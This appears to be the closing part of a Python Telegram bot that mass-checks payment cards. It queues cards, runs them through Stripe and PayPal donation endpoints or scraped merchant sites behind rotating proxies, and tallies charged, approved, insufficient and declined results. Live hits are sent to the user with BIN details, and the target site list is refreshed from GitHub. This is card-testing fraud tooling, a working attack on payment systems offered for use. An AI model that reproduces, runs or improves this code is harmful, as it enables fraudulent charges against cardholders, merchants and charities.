    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    async def dashboard_updater():
        while not is_stopped():
            for _ in range(30):
                if is_stopped(): break
                await asyncio.sleep(0.1)
            if is_stopped(): break
            
            el_n = int(time.time() - st)
            cpm = int((chk / el_n) * 60) if el_n > 0 else 0
            hn, mn, sn = el_n // 3600, (el_n % 3600) // 60, el_n % 60
            
            workers_display = "" if gate_name in ["Stripe", "PayPal"] else f"\n├ <b>Core Workers Allocation:</b> <code>{WORKERS} Virtual Cores</code>"
            dt = f"<b>╔══════════════════════════════╗\n     ⚜️ IMPERIAL ENGINE PROCESSING UNIT ⚜️\n╚══════════════════════════════╝</b>\n\n├ <b>Gateway Pipeline:</b> <code>{gate_name} V2 Pro</code>{workers_display}\n├ <b>Last Live Response:</b> <code>{last_resp}</code>\n╰ <b>Elapsed Operations Time:</b> <code>{hn:02d}h {mn:02d}m {sn:02d}s</code>"
            
            pct = int((chk / tot) * 100) if tot > 0 else 0
            kb = [
                [InlineKeyboardButton(f"📊 Completed Block: {chk}/{tot} ({pct}%)", callback_data="none")],
                [InlineKeyboardButton(f"👑 Charged: {chg}", callback_data="none"), InlineKeyboardButton(f"✨ Approved: {app}", callback_data="none")],
                [InlineKeyboardButton(f"⚡ Insufficient: {ins}", callback_data="none"), InlineKeyboardButton(f"❌ Declined: {dec}", callback_data="none")],
                [InlineKeyboardButton(f"⚠️ Proxy/Site Errors: {err}", callback_data="none")],
                [InlineKeyboardButton(f"🚀 Speed Index Velocity: {cpm} CPM", callback_data="none")],
                [InlineKeyboardButton("🛑 EMERGENCY ABORT ENGINE 🛑", callback_data=f"{stop_prefix}:{uid}")]
            ]
            try: await styled_edit(msg_obj, dt, buttons=kb)
            except asyncio.CancelledError: break
            except Exception: pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker(wid):
        await asyncio.sleep(wid * 0.05)
        nonlocal chk, chg, app, ins, dec, err, last_resp
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except Exception: break
            
            async with sem:
                if is_stopped(): break
                try:
                    c_st = time.time()
                    if gate_name == "Stripe":
                        p = random.choice(proxies) if proxies else None
                        res = await check_stripe_donate_api(card, p)
                    elif gate_name == "PayPal":
                        p = random.choice(proxies) if proxies else None
                        res = await check_paypal_donate_api(card, p)
                    else:
                        res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                    
                    if is_stopped(): break 
                    
                    c_el = time.time() - c_st
                    status = res.get('status', 'Dead')
                    chk += 1
                    
                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                    last_resp = (raw_msg[:35] + '...') if len(raw_msg) > 35 else raw_msg
                    
                    if status == 'Charged':
                        chg += 1
                        asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
                        asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
                    elif status == 'Approved':
                        app += 1
                        asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
                    elif status == 'Insufficient':
                        ins += 1
                        asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
                        asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
                    elif status == 'Site Error': err += 1
                    else: dec += 1
                except asyncio.CancelledError: break
                except Exception: err += 1; chk += 1
                finally:
                    queue.task_done()
                    if not is_stopped(): await asyncio.sleep(DELAY)

    wt_count = concurrency_limit
    wt = [asyncio.create_task(worker(i)) for i in range(wt_count)]
    process_store[uid]["tasks"] = wt + [ut]
    
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done(): ut.cancel()
        
    el = int(time.time() - st)
    el = el if el > 0 else 1
    avg_cpm = int((chk / el) * 60)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    
    workers_display = "" if gate_name in ["Stripe", "PayPal"] else f"\n├ <b>Thread Allocations:</b> <code>{WORKERS} Threads</code>"
    ft = f"<b>╔══════════════════════════════╗\n     ⚜️ OPERATIONAL CHANNELS COMPLETED ⚜️\n╚══════════════════════════════╝</b>\n\n├ <b>Target Gate:</b> <code>{gate_name} V2 Pro</code>{workers_display}\n├ <b>Terminal Last State:</b> <code>{last_resp}</code>\n╰ <b>Total Mission Time:</b> <code>{h:02d}h {m:02d}m {s:02d}s</code>"
    
    fkb = [
        [InlineKeyboardButton(f"📊 Processed Record Matrix: {chk}/{tot} (100%)", callback_data="none")],
        [InlineKeyboardButton(f"👑 Charged Hits: {chg}", callback_data="none"), InlineKeyboardButton(f"✨ Approved CVV: {app}", callback_data="none")],
        [InlineKeyboardButton(f"⚡ Insufficient Funds: {ins}", callback_data="none"), InlineKeyboardButton(f"❌ Dead Rejections: {dec}", callback_data="none")],
        [InlineKeyboardButton(f"⚠️ Proxy/Site Errors: {err}", callback_data="none")],
        [InlineKeyboardButton(f"🚀 Integrated Speed: {avg_cpm} CPM Avg", callback_data="none")]
    ]
    try: await styled_edit(msg_obj, ft, buttons=fkb)
    except Exception: pass
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bot):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
        kb = [[InlineKeyboardButton("🔱 Contact High Command 🔱", url="https://t.me/Dddadddyttt")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except Exception: pass

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; puid = int(q.data.split(":")[1])
    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: return await q.answer("❌ Unauthorised Intervention Attempted.", show_alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await q.answer("🛑 Engine Matrix Stopped Instantly. Core Resources Dropped.", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()

async def check_sites_loop():
    while True:
        await get_github_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    logger.info("🔄 Protocol: Webhook Purge Engine Initiating...")
    try: await app.bot.delete_webhook(drop_pending_updates=True)
    except Exception: pass
    try: await init_db()
    except Exception as e: logger.error(f"SQL Database Handshake Crash: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(60).write_timeout(60).connect_timeout(60).post_init(post_init).build()
    app.add_error_handler(global_error_handler)
    
    app.add_handler(MessageHandler(filters.ALL, master_router))
    
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
    
    logger.info("👑 ROYAL BOT SUITE ONLINE — NO ACCELERATION LAG DETECTED 👑")
    
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
            break
        except Conflict:
            logger.warning("Poller conflict instance found. Resolving overlap state in 5s...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"Fatal operational exception: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
